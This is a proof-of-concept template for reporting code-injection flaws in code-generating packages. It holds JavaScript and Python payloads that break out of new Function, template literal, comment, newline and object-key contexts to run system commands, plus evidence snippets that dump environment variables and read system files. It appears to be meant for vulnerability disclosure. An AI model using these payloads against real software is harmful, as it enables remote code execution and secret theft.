# PoC Skeleton — Code Injection via Code Generation

## Template

```python
#!/usr/bin/env python3
"""
CVE-CANDIDATE: Code Injection in [package-name] [version]
CWE: CWE-94 (Improper Control of Generation of Code)
CVSS: 9.8 CRITICAL (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
Tested version: [version]
"""

# Step 1: Setup
# pip install [package-name]==[version]
from package import vulnerable_function

# Step 2: Craft malicious input
# The payload escapes the code generation context and injects arbitrary code
malicious_input = '[PAYLOAD]'

# Step 3: Trigger the vulnerability
result = vulnerable_function(malicious_input)

# Step 4: Verify code execution
# Expected: the injected code executes (e.g., prints proof string, runs system command)
print(f"[+] Vulnerability triggered. Result: {result}")
```

## JavaScript PoC Variants

### Variant 1: new Function() Injection

```js
const pkg = require('[package-name]');

// Payload breaks out of string context in generated function
const payload = '");}; process.mainModule.require("child_process").execSync("id").toString(); //';

const result = pkg.vulnerableMethod(payload);
console.log('[+] RCE achieved:', result);
```

### Variant 2: Template Literal Escape

```js
const pkg = require('[package-name]');

// Payload uses backtick/interpolation to escape template literal context
const payload = '${require("child_process").execSync("id")}';

const result = pkg.vulnerableMethod(payload);
console.log('[+] RCE achieved:', result);
```

### Variant 3: Block Comment Escape

```js
const pkg = require('[package-name]');

// JSON.stringify doesn't escape */ so we break out of block comments
const payload = '*/ require("child_process").execSync("id"); /*';

const result = pkg.vulnerableMethod({ name: payload });
console.log('[+] RCE via block comment escape:', result);
```

### Variant 4: sourceURL / Line Injection

```js
const pkg = require('[package-name]');

// Newline injection to add code after the generated function
const payload = 'legitimate\n}; process.mainModule.require("child_process").execSync("id"); //';

const result = pkg.vulnerableMethod(payload);
console.log('[+] RCE via line injection:', result);
```

### Variant 5: Object Key Injection

```js
const pkg = require('[package-name]');

// When object keys are interpolated into generated code without escaping
const obj = { 'a]); require("child_process").execSync("id"); //': 'value' };

const result = pkg.vulnerableMethod(obj);
console.log('[+] RCE via key injection:', result);
```

## Python PoC Variant

```python
import package_name

# Payload for eval/exec injection
payload = "__import__('os').system('id')"

# Or for string context escape:
payload = "'); __import__('os').system('id'); #"

result = package_name.vulnerable_function(payload)
print(f"[+] RCE achieved: {result}")
```

## Evidence Collection

For all PoCs, demonstrate impact with non-destructive proof:

```js
// Option 1: Command execution proof (non-destructive)
require("child_process").execSync("id").toString()
// Expected: "uid=501(user) gid=20(staff) ..."

// Option 2: File read proof
require("fs").readFileSync("/etc/hostname").toString()

// Option 3: Environment access proof
JSON.stringify(process.env)

// Option 4: Write to temp file as evidence
require("fs").writeFileSync("/tmp/poc-evidence.txt", "code-execution-confirmed")
```

## Reporting Template

```
## Vulnerability: Code Injection in [function_name]

**File**: `src/[file].js:LINE`
**Sink**: `new Function()` at line LINE
**Source**: User input via `[parameter]` parameter
**Data flow**: [entry_point] -> [intermediate] -> new Function(tainted_string)
**Escaping**: [none / insufficient — explain why]

### Impact
Remote Code Execution. An attacker can execute arbitrary JavaScript code
on the server by providing crafted input to [function_name].

### Reproduction
1. Install: `npm install [package]@[version]`
2. Run: `node poc.js`
3. Observe: system command `id` is executed

### Suggested Fix
Use parameterized code generation or escape all interpolated values:
- Replace string concatenation with AST-based code generation
- Or escape values using a context-aware escaper before interpolation
```
